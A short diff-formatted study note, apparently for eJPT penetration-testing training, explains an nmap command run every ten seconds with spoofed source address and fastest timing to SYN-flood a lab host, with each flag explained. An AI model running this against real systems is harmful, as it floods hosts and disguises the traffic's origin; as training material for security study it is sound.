@@ -1,0 +1,11 @@
+[eJPT][nmap]Apply Nmap to Synflood
+
+Command:
+#watch -n 10 "nmap -e wlan0 -Pn -T5 -S 192.168.0.253 192.168.0.251"
+
+-e wlan0: Specify the network adapter sending the packets.
+-Pn: There is no need to PING before launching the scan.
+-T5: The fastest rate.
+-S 192.168.0.253: Spoofing the packet source as 192.168.0.253.
+192.168.0.251: The target.
+The nmap scan would be repeatedly launched every 10 seconds by using the watch command.
